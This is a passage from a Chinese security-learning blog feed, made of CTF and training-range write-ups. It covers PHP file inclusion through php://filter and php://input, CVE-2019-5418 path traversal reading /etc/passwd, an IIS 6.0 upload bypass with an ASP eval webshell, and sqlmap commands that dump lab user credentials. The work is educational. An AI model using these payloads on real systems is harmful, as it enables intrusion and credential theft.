class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'language'</span>]; <span class="hljs-comment">#语言切换</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$lan</span>)<br>{<br>@<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"language"</span>,<span class="hljs-string">"english"</span>); <span class="hljs-comment"># setcookie向客户端发送跟一个Http cookie(由服务器发送到浏览器的变量)</span><br>@<span class="hljs-keyword">include</span>(<span class="hljs-string">"english.php"</span>); <span class="hljs-comment"># 导入语言包</span><br>}<br><span class="hljs-keyword">else</span><br>{<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$lan</span>.<span class="hljs-string">".php"</span>);<span class="hljs-comment"># 后缀.php</span><br>}<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'index.php'</span>); <span class="hljs-comment"># index.php 读取到$x中</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>; <span class="hljs-comment">#输入x</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>设置cookie-language，就可以执行<code>include($lan.".php")</code></p><p>用伪协议<code>php://filter</code>读取文件，格式为：<code>php://filter / [read|write =] 过滤器 / resource= 目标文件 </code></p><h2 id="过滤器的分类（及常见过滤器）"><a href="#过滤器的分类（及常见过滤器）" class="headerlink" title="过滤器的分类（及常见过滤器）"></a>过滤器的分类（及常见过滤器）</h2><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤应用，</p><ul><li>string filter(字符过滤器)<ul><li>string.rot13  (对字符串执行 ROT13 转换)<ul><li>例：<code>php://filter/string.rot13/resource=flag.php</code></li></ul></li><li>string.toupper (转大写)<ul><li>例：<code>php://filter/string.toupper/resource=flag.php</code></li></ul></li><li>string.tolower (转小写)</li><li>string.strip_tags (去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果)<ul><li>例：<code>php://filter/string.strip_tags/resource=flag.php</code></li></ul></li></ul></li><li>conversion filter (转换过滤器)<ul><li>convert.base64-encode &amp; convert.base64-decode (base64加密 base64解密)<ul><li>例：<code>php://filter/convert.base64-encode/resource=flag.php</code></li></ul></li><li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode(在字符串后加=0A,及恢复)</li></ul></li><li>compression filter(压缩过滤)<ul><li>zlib.deflate &amp; zlib.inflate(压缩 解压)<ul><li>例：<code>php://filter/zlib.deflate/resource=flag.php</code></li><li>例：<code>php://filter/zlib.inflate/resource=flag.php</code></li></ul></li><li>bzip2.compress &amp; bzip2.decompress(zip 压缩 解压)</li></ul></li><li>encryption filter(加密过滤器)</li></ul><blockquote><p>resource=&lt;要过滤的数据流&gt; ： 必须参数，指定了要筛选过滤的数据流</p><p>read=&lt;独链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔</p><p>write=&lt;写链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔</p><p>&lt;;两个链的筛选列表&gt; ： 任何没有以read=或write=做前缀的筛选器列表会视情况应用于读或写链</p></blockquote><p>payload：</p><pre><code class="hljs">`cookie：language=php://filter/convert.base64-encode/resource=flag</code></pre><p>bp抓包，把cookie改成payload,即可得到密文，base64解密即可，或者直接在网页端把cookie改了也行</p><p><img src="https://s2.loli.net/2022/08/17/91ciqRSd3XZpT52.png" alt="图片.png"></p><p>flag: </p><pre><code class="hljs">cyberpeace{771e511122aa7492d439ae469279c22e}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/08/17/dhX79DGxo4rptkT.png&quot; alt=&quot;图片.</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web-very_easy_sql</title>
    <link href="https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/"/>
    <id>https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/</id>
    <published>2022-08-17T03:00:36.731Z</published>
    <updated>2022-08-17T04:41:04.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>太简单了不描述了，给sql签个到吧</p><p><img src="https://s2.loli.net/2022/08/17/7eIHtGJviqkMPbW.png" alt="图片.png"></p><p>题目上说：非内部用户无法访问。</p><p>查看源代码，发现有个use.php文件：</p><p><img src="https://s2.loli.net/2022/08/17/86yfplcZIVDboBu.png" alt="图片.png"></p><p>不行，看大佬写的wp好难，看不懂，先放一放。</p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126309908" title="大佬的博文wp">https://blog.csdn.net/m0_48780534/article/details/126309908</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述:&quot;&gt;&lt;/a&gt;题目描述:&lt;/h1&gt;&lt;p&gt;太简单了不描述了，给sql签个到吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="sql" scheme="https://sinky.top/tags/sql/"/>
    
    <category term="SSRF" scheme="https://sinky.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="https://sinky.top/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://sinky.top/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-08-16T08:10:38.035Z</published>
    <updated>2022-08-16T08:46:11.888Z</updated>
    
    <content type="html"><![CDATA[<p>os: 整合了一下各路大佬的笔记，省得搜来搜去……</p><p>在CTF中可能遇到的文件包含函数：</p><p>include、require、include_once、require_once、highlight_file、show_source、readfile、file_get_contents、fopen、file</p><h1 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h1><p>php伪协议事实上就是支持的协议与封装协议（12种）</p><ul><li>file:// — 访问本地文件系统</li><li>http:// — 访问 HTTP(s) 网址</li><li>ftp:// — 访问 FTP(s) URLs</li><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>zlib:// — 压缩流</li><li>data:// — 数据（RFC 2397）</li><li>glob:// — 查找匹配的文件路径模式</li><li>phar:// — PHP 归档</li><li>ssh2:// — Secure Shell 2</li><li>rar:// — RAR</li><li>ogg:// — 音频流</li><li>expect:// — 处理交互式的流</li></ul><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file://"></a>file://</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。</p><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php://"></a>php://</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><ul><li>php://input  ——可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</li><li>php://output  ——只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</li><li>php://fd  ——(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</li><li>php://memory 与 php://temp  ——(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</li><li>php://filter  ——(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</li></ul><p>太多了懒得敲了</p><p>贴 </p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;os: 整合了一下各路大佬的笔记，省得搜来搜去……&lt;/p&gt;
&lt;p&gt;在CTF中可能遇到的文件包含函数：&lt;/p&gt;
&lt;p&gt;include、require、include_once、require_once、highlight_file、show_source、readfile、f</summary>
      
    
    
    
    
    <category term="php" scheme="https://sinky.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>CTF-fileclude</title>
    <link href="https://sinky.top/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/"/>
    <id>https://sinky.top/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/</id>
    <published>2022-08-16T07:41:34.049Z</published>
    <updated>2022-08-16T08:46:11.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>fileclude</p><p>描述：好多file呀！</p><p>还没学php，简单分析一下代码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);  <span class="hljs-comment"># 引入flag.php文件</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment"># 对文件进行语法高亮显示</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>])) <span class="hljs-comment"># isset()函数：检测变量是否设置；$_GET[]通过get方法传过来的值</span><br>{<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]; <br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>)) <span class="hljs-comment"># empty()用于检查一个变量是否为空，此处即file1与file2不为空</span><br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">"hello ctf"</span>) <span class="hljs-comment"># file_get_contents()把整个文件读入一个字符串中，此处即将hello ctf读取到fikle2中</span><br>        {<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>); <span class="hljs-comment"># 包含$file1</span><br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NONONO"</span>);<br>} <br></code></pre></td></tr></tbody></table></figure><p>（看来想学渗透的话，php学习要提上日程了[汗颜]）</p><p>$file2内容为hello ctf就可以包含$file1，从题目中可看出flag在flag.php中，此题考察<code>file_get_contents</code>和php伪协议的应用</p><p>（有关php伪协议单独写了一篇文，标签为php）</p><p>f12打开 Max HackBar插件</p><p>使用伪协议来构造，得到payload为<code>php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code>，post data为<code>hello ctf</code></p><p>（不会，搜的大佬wp）</p><p><img src="https://s2.loli.net/2022/08/16/usWiTyB1tdeAqX6.png" alt="图片.png"></p><p>base64解码就得到flag:</p><pre><code class="hljs">cyberpeace{a0dfa411a1fd4d2c2153ad62391732cf}</code></pre><p>关于payload如何构造的，我又去查了一下php伪协议，搜到了一个例子：</p><p>例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p><pre><code class="hljs">?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>解释：php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。如果不进行 base64 编码传入，index.php 就会直接执行，就看不到文件中的内容了。（博文已贴）</p><p><a href="https://www.cnblogs.com/pursue-security/p/15374168.html" title="php伪协议">https://www.cnblogs.com/pursue-security/p/15374168.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;fileclude&lt;/p&gt;
&lt;p&gt;描述：好多file呀！&lt;/p&gt;
&lt;p&gt;还没学php，简单分析一下代码：&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Ruby On Rails漏洞复现第二题（CVE-2019-5418）</title>
    <link href="https://sinky.top/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/"/>
    <id>https://sinky.top/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/</id>
    <published>2022-08-16T03:07:09.028Z</published>
    <updated>2022-08-16T03:58:12.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。</p><h1 id="实训目标"><a href="#实训目标" class="headerlink" title="实训目标"></a>实训目标</h1><p>1、学会根据漏洞编号查找漏洞详情；</p><p>2、了解Ruby On Rails（CVE-2019-5418）形成原理；</p><p>3、学习Ruby On Rails（CVE-2019-5418）利用方法；</p><h1 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向"></a>解题方向</h1><p>利用已知漏洞读取文件passwd;</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://s2.loli.net/2022/08/16/JMXnoHVlb8zF4xy.png" alt="image.png"></p><p>先百度查一下CVE-2019-5418漏洞详情：</p><blockquote><p>漏洞描述：由于Rubt on Rails使用了指定参数的render file来渲染应用之外的视图，可以通过修改访问某控制器的请求包，通过“../../../../”来达到路径穿越的目的，然后再通过<code>\{\{</code>(此处是两个左大括号，因为语法问题只能这么写了，下同此原因)来进行模板查询路径的闭合，使得所要访问的文件被当作外部模板来解析。</p><p>影响版本：Rails全版本，其中修复版本：6.0.0.beta3; 5.2.2.1; 5.1.6.2; 5.0.7.2; 4.2.11.1</p></blockquote><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>访问IP：端口/robots，bp抓包</p><ul><li>robots文件：网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，即robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。</li></ul><p><img src="https://s2.loli.net/2022/08/16/idZAkJxQUTznqug.png" alt="image.png"></p><p>修改数据包Accept内容为 <code>../../../../../etc/passwd\{\{</code>,通过路径穿越实现了任意文件读取</p><p><img src="https://s2.loli.net/2022/08/16/f9dTYX3nKCPrkpi.png" alt="image.png"></p><pre><code class="hljs">key: mozhe0b757871236a2e73bad56ff2eb6</code></pre><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1、升级</p><p>2、禁止接受accept任意的type</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sp</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="任意文件读取" scheme="https://sinky.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>靶场：内部文件上传系统漏洞分析溯源</title>
    <link href="https://sinky.top/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/"/>
    <id>https://sinky.top/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/</id>
    <published>2022-08-14T03:21:54.947Z</published>
    <updated>2022-08-14T08:31:03.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可以通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p><p>当系统存在文件上传漏洞时，攻击者可以将病毒、木马、WebShell以及其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利，根据具体漏洞差异，上传的脚本可以是正常后缀的PHP、ASP以及JSP脚本，也可以是串改后缀后的这几类脚本。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://s2.loli.net/2022/08/14/WX6tx1Kej5ZpqhL.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/14/HZT3dXicvLjsDVY.png" alt="image.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>验证上传点是否可直接上传一句话木马</li><li>验证是否存在前端验证</li><li>验证是否开启mime绕过</li><li>验证是否开启文件否检测</li><li>验证是否存在文件解析漏洞验证</li></ul><p>一句话木马</p><p><img src="https://s2.loli.net/2022/08/14/BWPjHVbX1dt4EZk.png" alt="image.png"></p><p>上传失败</p><p>php或asp文件无法上传，但txt、jpg等可以上传</p><p><img src="https://s2.loli.net/2022/08/14/SlGY1gDMq3zHyvN.png" alt="image.png"></p><p>通过F12查看服务，为IIS/6.0</p><p><img src="https://s2.loli.net/2022/08/14/x8AgbWo5nOzI4iT.png" alt="image.png"></p><h2 id="IIS6-0漏洞"><a href="#IIS6-0漏洞" class="headerlink" title="IIS6.0漏洞"></a>IIS6.0漏洞</h2><p>该版本默认将<code>.asp;.jpg</code>此种格式的文件名，当成asp解析，服务器默认不解析;号极其后面的内容，相当于截断。</p><p>例如：上传一个图片文件，名字为“xiao.asp;.jpg”的木马文件，该文件可以被当作asp文件解析并执行。</p><p>IIS除了会将asp解析成脚本执行文件之外，还会将cer sdx asa 扩展名解析成asp。</p><h2 id="构造一句话木马"><a href="#构造一句话木马" class="headerlink" title="构造一句话木马"></a>构造一句话木马</h2><p>当我们上传xxx.asp文件时，该文件以后的子文件都以asp文件来执行。</p><pre><code class="hljs">&lt;% eval request("a") %&gt;</code></pre><p>上传一句话木马的hack.txt文件，并用bp抓包：</p><p><img src="https://s2.loli.net/2022/08/14/u1CvZxBTWojQlUR.png" alt="image.png"></p><p>改成hack.asp，这样服务器读到hack.asp目录时后面都以asp文件执行。</p><p><img src="https://s2.loli.net/2022/08/14/5lFZPXVgAWcmYus.png" alt="image.png"></p><p>最后打开蚁剑，连接其返回地址，找到key即可。</p><p><img src="https://s2.loli.net/2022/08/14/XszVYDNge8LFrT2.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/14/wDFysAPbvq5tGr9.png" alt="image.png"></p><pre><code class="hljs">KEY:mozhe7f5448dfef4b57464d1c37c75bf </code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>（2022.8.14）<br>做题时看大佬的writeup解的，完全不会，一知半解，做完了感觉会了一点，最起码了解了IIS6.0漏洞和文件上传漏洞的测验方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可以通过web访问的目录</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="文件上传" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="WebShell" scheme="https://sinky.top/tags/WebShell/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-SQL注入</title>
    <link href="https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-08-14T02:39:51.516Z</published>
    <updated>2022-08-14T02:42:04.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p><p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p><p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p><p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" alt="图片.png"></p><p>随便提交，抓包可知，是post方式提交的参数为</p><pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>使用sqlmap跑post方式时的格式为：</p><pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;</code></pre><p>1、使用sqlmap跑数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p>注释：</p><ul><li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li><li>‐‐dbs 当用户有权读取时，列出所有的数据库</li><li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li></ul><p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" alt="图片.png"></p><p>2、查数据库pikachu下的表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch</code></pre><p>注释：</p><ul><li>‐D pikachu 指定数据库pikachu</li><li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li></ul><p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" alt="图片.png"></p><p>3、获取表users中的列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p>注释：</p><ul><li>‐T users 指定表明users</li><li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li><li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" alt="图片.png"></li></ul><p>4、获取列username和password中的字段内容</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p>注释：</p><ul><li>‐C username,password 指定读取列username和password中的字段内容</li><li>‐‐dump 抛出前面指定内容</li></ul><p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" alt="图片.png"></p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p><p>2、提交恒等语句可以查询到所有的数据信息</p><p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" alt="图片.png"></p><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" alt="图片.png"></p><p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" alt="图片.png"></p><p>GET方法取表，抓包：</p><p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" alt="图片.png"></p><p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p><p>使用sqlmap跑：</p><p>1、查数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs </code></pre><p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" alt="图片.png"></p><p>2、查表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" alt="图片.png"></p><p>3、查列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" alt="图片.png"></p><p>4、查字段</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" 